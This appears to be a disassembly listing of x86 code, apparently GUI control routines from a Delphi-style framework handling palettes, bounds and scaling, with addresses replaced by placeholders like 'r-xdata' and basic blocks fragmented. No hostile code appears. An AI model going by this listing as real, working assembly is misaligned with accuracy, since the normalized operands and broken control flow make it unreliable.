mov [ fs : eax ] edx
push sub_437874
lea eax [ ebp - 0x1c ]
call sub_403f90
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403454
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_447f30
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a04
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403fe4
sub_437890
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4378f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_444ffc
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_438a40
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ eax + 0x64 ]
pop eax
call sub_40439c
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4378fe
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov al 0x1
sub_437904
push ebx
mov ebx eax
mov eax ebx
call sub_445024
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_437938
push ebx
mov ebx eax
mov eax ebx
call sub_445074
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_40439c
je r-xdata
mov al 0x1
pop ebx
retn
sub_437970
push ebx
mov ebx eax
mov eax ebx
call sub_4450b0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4379a4
push ebx
mov ebx eax
mov eax ebx
call sub_419a50
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4379cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_438a70
sub_4379ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_437a0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403fe4
sub_437a30
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_438960
sub_437a50
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_437a7c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_40439c
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_437ae0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4383bc
sub_437b00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4383a8
sub_437b20
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_437b40
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41914c
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c010
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_438af0
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_437660
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_4399b4
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_437c18
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4035cc
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_457340
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035b4
push edi
xor ecx ecx
mov edx 0xb039
call sub_439bf4
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_4383e0
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403454
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403258
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403258
mov eax [ edi + 0x68 ]
call sub_403258
mov eax [ edi + 0x64 ]
call sub_408574
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419198
test bl bl
jle r-xdata
sub_437ce4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_437d0c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403454
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437d94
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_438094
sub_437db4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403258
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_43aa10
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403454
mov edx ebx
mov eax edi
call sub_41921c
mov eax ebx
mov si 0xffd9
call sub_403454
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_437e7c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4195ac
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_439bf4
sub_437f10
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419468
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_4389f8
jmp r-xdata
xor edx edx
mov eax esi
call sub_437db4
sub_437f54
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403454
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_437d94
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403454
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_437ffc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_43a184
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_438e88
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_438094
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_439bf4
mov eax ebx
mov si 0xffd0
call sub_403454
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403454
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_438094
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_43f52c
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_4381b0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_4381d4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_4381fc
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_438220
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_438244
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43833f
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403454
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438346
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4138f0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403454
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403454
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413650
sub_438350
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_438e88
mov edx edi
mov eax ebx
call sub_438400
mov edx edi
mov eax ebx
call sub_439c98
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4383bc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403fe4
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_438400
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43845c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_438488
mov edx eax
mov ecx esp
mov eax esi
call sub_412350
mov edx esp
mov eax ebx
call sub_4388cc
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4384a0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_438444
mov ecx esp
mov edx esi
call sub_412350
mov edx esp
mov eax ebx
call sub_4388cc
pop ecx
pop edx
pop esi
pop ebx
retn
sub_438509
dec [ ebx + 0x1b2f44d ]
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438550
lea eax [ ebp - 0xc ]
call sub_403f90
retn
sub_438558
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_438584
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4385b0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_453894
sub_4385e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_439bf4
sub_43865c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41c468
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41c484
sub_438828
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4388be
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4196a4
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_438a40
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_40439c
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4388c5
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_438a70
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_4388cc
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_438914
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
test esi esi
je r-xdata
mov edx ebx
call sub_43bea0
mov edx ebx
mov eax esi
call sub_43bdcc
mov eax ebx
call sub_438094
sub_438960
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403454
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_439bf4
mov eax edi
mov si 0xffd0
call sub_403454
sub_4389f8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_44c808
mov edx ebx
mov eax esi
call sub_41921c
